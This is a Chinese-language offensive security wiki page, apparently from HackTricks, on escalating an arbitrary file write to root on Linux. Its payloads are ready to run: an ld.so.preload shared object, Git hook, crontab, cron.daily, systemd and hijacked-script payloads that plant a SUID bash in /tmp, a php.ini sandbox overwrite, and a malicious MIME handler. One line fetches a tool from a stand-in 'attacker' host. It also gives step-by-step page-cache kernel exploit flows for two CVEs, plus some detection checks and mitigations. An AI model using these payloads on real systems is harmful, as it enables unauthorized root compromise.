# 向 Root 任意写入文件

### /etc/ld.so.preload

`/etc/ld.so.preload` 是一个系统范围的共享对象列表，动态链接器会在其他共享对象之前加载这些对象。安全执行模式会对预加载施加额外限制，因此像 `/tmp/pe.so` 这样的 library path 并不是通用的 SUID-binary technique。\
如果你能够创建或修改该文件，加载它的进程就会在加载其他共享对象之前加载其中列出的 library，从而允许在该进程的 context 中执行代码。<sup>[[12]](#references)</sup>

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** 是在 repository 中发生事件时运行的可执行脚本，包括 commit 和 merge 操作。如果执行这些操作的是 **privileged script 或 user**，且 attacker 可以在 **`.git` folder** 中 **write**，则该 hook 可用于 **privilege escalation**。<sup>[[13]](#references)</sup>

例如，可以在 git repo 的 **`.git/hooks`** 中 **generate a script**，使其在创建新 commit 时始终执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron 和时间文件

如果你可以**写入由 root 执行的 Cron 相关文件**，通常就能在任务下次运行时获得代码执行权限。值得关注的目标包括：<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- root 自己的 crontab，位于 `/var/spool/cron/` 或 `/var/spool/cron/crontabs/`
- `systemd` timers 及其触发的服务

快速检查：
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的滥用路径：

- **向 `/etc/crontab` 或 `/etc/cron.d/` 中的文件追加新的 root cron 任务**
- **替换已由 `run-parts` 执行的脚本**
- **通过修改现有 timer 目标所启动的脚本或二进制文件，为其植入后门**

最小 cron payload 示例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
如果你只能写入由 `run-parts` 使用的 cron 目录，则改为在那里放置一个可执行文件：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
备注：

- `run-parts` 通常会忽略包含点号的文件名，因此优先使用 `backup` 之类的名称，而不是 `backup.sh`。<sup>[[15]](#references)</sup>
- 某些系统使用 `systemd` timers 代替经典 cron，但滥用思路相同：**修改 root 稍后将执行的内容**。<sup>[[20]](#references)</sup>

### 服务与 Socket 文件

如果你可以写入 **`systemd` unit 文件**或其引用的文件，那么可以通过重新加载并重启 unit，或等待服务/Socket activation 路径触发，以 root 身份实现 code execution。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

有趣的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 Drop-in overrides
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 引用的 Service scripts/binaries
- root service 加载的可写 `EnvironmentFile=` 路径

快速检查：
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
常见的滥用路径：

- **覆盖 `ExecStart=`**：在你可以修改的 root-owned service unit 中进行覆盖
- **添加 drop-in override**：先清除旧的 `ExecStart=`，再添加恶意的 `ExecStart=`
- **对 unit 已引用的脚本/二进制文件植入后门**
- **劫持 socket-activated service**：修改相应的 `.service` 文件，该文件会在 socket 收到连接时启动

恶意 override 示例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的激活流程：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
如果你无法自行重启服务，但可以编辑由 socket 激活的 unit，则可能只需**等待客户端连接**，即可触发以 root 身份执行带后门的服务。<sup>[[17]](#references)</sup>

### 覆盖特权 PHP sandbox 使用的受限 `php.ini`

某些自定义 daemon 会通过使用**受限的 `php.ini`** 运行 `php`，来验证用户提供的 PHP（例如，`disable_functions=exec,system,...`）。如果 sandbox 中的代码仍具有**任何写入原语**（例如 `file_put_contents`），并且你能够访问 daemon 使用的**确切 `php.ini` 路径**，则可以**覆盖该配置**以解除限制，然后提交第二个 payload，使其以提升后的权限运行。<sup>[[2]](#references)</sup>

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 第二个 payload 在危险函数重新启用后执行代码。

最小示例（替换为 daemon 使用的路径）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
如果 daemon 以 root 身份运行（或使用 root 拥有的路径进行验证），第二次执行将获得 root 上下文。当 sandboxed runtime 仍能写入文件时，这本质上就是通过覆盖配置实现的 **privilege escalation**。

### binfmt_misc

`binfmt_misc` 在 `/proc/sys/fs/binfmt_misc` 下公开注册项；每个注册项都会将一种文件类型模式与一个 interpreter 关联起来。其权限影响取决于谁可以更改该注册项，以及之后哪个进程会执行匹配的文件，因此在将其视为 privilege-escalation 路径之前，应先验证这些条件。<sup>[[21]](#references)</sup>

### 覆盖 schema handlers（如 http: 或 https:）

Desktop environments 使用 MIME associations 和 desktop entries 来选择 URI schemes 的应用程序；能够写入相关 per-user configuration 和 desktop-entry directories 的 attacker，可以将这些 schemes 重定向到其控制的 launcher。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL handlers 指向恶意文件（例如 `x-scheme-handler/http=evil.desktop` 和 `x-scheme-handler/https=evil.desktop`），用户点击即可调用该 desktop entry。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root 执行用户可写的脚本/二进制文件

如果特权工作流运行类似 `/bin/sh /home/username/.../script` 的命令（或运行由非特权用户拥有的目录中的任何二进制文件），你可以劫持它：<sup>[[1]](#references)</sup>

- **检测执行过程：** 使用 pspy 监控进程，以捕获 root 调用用户可控路径的情况。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **确认可写性：**确保目标文件及其目录归你的用户所有，且你的用户拥有写权限。
- **劫持目标：**备份原始 binary/script，并放置一个可创建 SUID shell（或执行任何其他 root 操作）的 payload，然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发特权操作**（例如按下会启动 helper 的 UI 按钮）。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

### 仅修改特权二进制 page cache 中的文件

某些 kernel bugs 不会修改磁盘上的文件。相反，它们只允许你修改可读文件的 **page cache 副本**。如果目标是 **setuid** 或以其他方式由 **root 执行** 的 binary，那么下一次执行可能会运行内存中由攻击者控制的字节，即使磁盘上的文件 hash 未发生变化，也能实现权限提升。<sup>[[3]](#references)[[4]](#references)</sup>

可以将其理解为一种 **仅运行时的文件写入 primitive**：<sup>[[3]](#references)</sup>

- **磁盘保持干净**：inode 和磁盘上的字节不会改变
- **内存变脏**：读取或执行该缓存 page 的进程会获得攻击者修改后的内容
- **效果是临时的**：重启或 cache eviction 后修改会消失

这种 primitive 介于传统的 **arbitrary file write** 与 Dirty COW / Dirty Pipe 等较早的 **page-cache abuse** bugs 之间：<sup>[[3]](#references)</sup>

- Dirty COW 依赖 race
- Dirty Pipe 存在写入位置限制
- 如果存在漏洞的路径能够直接写入 file-backed cached pages，page-cache-only primitive 可能更加可靠

#### 通用 privesc 流程

1. 获取能够写入 **file-backed page cache pages** 的 kernel primitive
2. 将其用于一个 **可读的特权 binary** 或其他由 root 执行的文件
3. 在 page 被从 cache 中 eviction 之前触发执行
4. 在磁盘文件看起来仍未修改的情况下，以 root 身份获得 code execution

典型的高价值目标：

- **setuid-root** binaries
- 由 **root services** 启动的 helpers
- 经常从共享 host kernel/page cache 的 **containers** 中执行的 binaries

#### AF_ALG + `splice()` 示例路径

Copy Fail (CVE-2026-31431) 是此类问题的一个典型示例。漏洞路径位于 Linux crypto userspace API（`AF_ALG` / `algif_aead`）中：<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` 可以将 readable file 的 page-cache pages 引用移动到 crypto TX scatterlist 中
- in-place `algif_aead` decrypt path 复用了 source 和 destination buffers
- `authencesn` 随后写入 destination tag region
- 当该 region 仍引用 spliced file-backed pages 时，写入就会落入目标文件的 **page cache**

因此，值得关注的 technique 并不是 CVE 本身，而是以下模式：

- **将 file-backed cache pages 输入 kernel subsystem**
- 让 subsystem **将其视为可写的 output**
- 在内存中触发小范围、受控的 overwrite

公开的 PoC 使用重复的 **4-byte writes** 修改内存中的 `/usr/bin/su`，然后执行它。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone 示例路径

DirtyClone (CVE-2026-43503) 展示了同一种 **page-cache-only write-to-root** 模式的另一种变体，但这次 sink 是 **IPsec ESP decrypt**，而不是 `AF_ALG`。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

这里重要的 technique 是 **metadata-laundering 步骤**：

- `splice()` 将一个 **只读的 file-backed page-cache page** 放入 ESP-in-UDP packet
- 原始的 DirtyFrag mitigation 为该 skb 添加 `SKBFL_SHARED_FRAG` 标记，使 `esp_input()` 在 decrypt 前执行 **copy**
- netfilter `TEE` 通过 `nf_dup_ipv4()` -> `__pskb_copy_fclone()` 复制该 packet
- clone 保留相同的 **physical page-cache reference**，但丢失 `SKBFL_SHARED_FRAG`
- `esp_input()` 随后将该 clone 视为安全对象，并在 file-backed page 上执行 **in-place `cbc(aes)` decrypt**

因此，给 reviewer 的经验不应局限于该 CVE：如果某个 mitigation 依赖 **skb/page metadata** 来判断操作是否必须先执行 copy，那么任何**保留 backing page 但丢弃 metadata 的 clone/copy path** 都可能悄然重新开启该 write primitive。

典型的 exploitation 流程：

1. 使用 `unshare(CLONE_NEWUSER | CLONE_NEWNET)` 在私有 network namespace 内获得 **`CAP_NET_ADMIN`**
2. 启用 loopback，并在 `mangle/OUTPUT` 中安装 **netfilter `TEE` rule**
3. 通过 `NETLINK_XFRM` 安装 **XFRM ESP transport SAs**
4. 将每个目标 4-byte word 编码到 SA 的 `seq_hi` field 中（DirtyFrag 的 word-selection trick）
5. 发送 spliced ESP-in-UDP packet，使 **TEE clone** 到达 `esp_input()` 并执行 **in-place** decrypt
6. 重复上述过程，直到 `/usr/bin/su` 或其他特权 executable 的 page-cache 副本包含攻击者控制的 code

从实际影响来看，这与 `AF_ALG` 示例相同：磁盘上的文件保持干净，但 `execve()` 会使用**已修改的 page-cache bytes**，从而获得 root。<sup>[[8]](#references)[[9]](#references)</sup>

此变体的实用暴露面检查：
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
此处短期内降低 attack surface 也具有路径针对性：升级到包含 `48f6a5356a33` 的 kernel 可修复 clone path，而阻止 `xt_TEE` autoload 会移除 **flag-laundering step**，阻止 `esp4` / `esp6` 则会移除 **decrypt sink**。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure and hunting

如果怀疑存在此类 bug，不要只依赖磁盘完整性检查。还应验证：
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下配置值区分了可加载 interface 与内置于 kernel 的 interface；crypto build rules 将 `CONFIG_CRYPTO_USER_API_AEAD` 映射到 `algif_aead`。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`：`algif_aead` 可以作为 module 加载或卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`：该 interface 已内置于 kernel
- setuid binaries 是很好的目标，因为仅修改 page cache 就可能足以将 local foothold 转变为 root

#### `algif_aead` 路径的攻击面缩减

如果 vulnerable interface 由可加载 module 提供：<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
如果它被编译进 kernel，一些披露报告称其会阻塞 init 路径：<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
这种缓解措施也值得在其他 kernel LPE 中牢记：如果 exploitation 依赖某个特定的可选接口，那么禁用或列入黑名单该接口，即使在完整 kernel upgrade 尚不可用之前，也能切断 exploit 路径。<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – 劫持在用户可写 PaperCut 目录中以 root 身份执行的脚本](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail（CVE-2026-31431）FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall 针对 CVE-2026-31431 的 oss-security 披露](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable 修复：crypto: algif_aead - 恢复为 out-of-place 操作](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint 技术分析](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: 剖析并利用 Linux LPE 变体 DirtyClone（CVE-2026-43503）](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux 修复：net: skb: 在 `__pskb_copy_fclone()` 中保留 `SKBFL_SHARED_FRAG`（`48f6a5356a33`）](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux 早期缓解措施：为 splice 的 UDP 数据包设置 `SKBFL_SHARED_FRAG`（`f4c50a4034e6`）](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel 文档](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG 页面缓存漏洞](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
